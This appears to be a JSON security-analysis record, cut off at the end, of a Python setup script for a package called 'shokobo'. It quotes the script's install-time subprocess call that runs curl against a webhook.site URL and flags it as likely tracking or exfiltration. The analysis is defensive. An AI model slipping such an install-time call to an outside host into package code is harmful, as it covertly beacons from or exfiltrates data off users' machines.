{
  "purpose": "The script is used for setting up a Python package named 'shokobo' with specified dependencies, but it also executes a subprocess to fetch a URL via curl.",
  "sources": "subprocess.run(['curl', 'https://webhook.site/c33c9bd8-baf5-4abd-b3d2-525a1e8dcc2c'])",
  "sinks": "The subprocess executes an external command which could potentially be used for malicious purposes if the URL leads to malicious content or is used for command injection.",
  "flows": "The code flows from executing the subprocess command to make an HTTP request, which could be exploited for remote code execution or data exfiltration if the URL is malicious.",
  "anomalies": "The subprocess call to 'curl' in a setup script is unusual; normally, package setup files do not perform network calls. The URL 'https://webhook.site/...' is a known testing endpoint that could be used for tracking or data exfiltration, indicating malicious intent or suspicious behavior.",
  "analysis": "The code imports setuptools for package setup, which is normal. However, it immediately runs a subprocess to execute 'curl' on a specific URL. This network call occurs during package setup, which is suspicious and unusual. The URL appears to be a webhook endpoint, potentially used for tracking or exfiltrating information. The rest of the code defines package metadata and dependencies, which are typical and do not pose security issues. The subprocess call is the primary anomaly, representing an active network request outside normal setup procedures, potentially serving malicious or tracking purposes.",
  "conclusion": "The code includes a suspicious subprocess call to an external URL during package setup, which could be used for tracking, exfiltration, or malicious activity. This behavior is atypical and indicates possible malicious intent or at least malicious surveillance activity. The rest of the code appears standard for package configuration.",
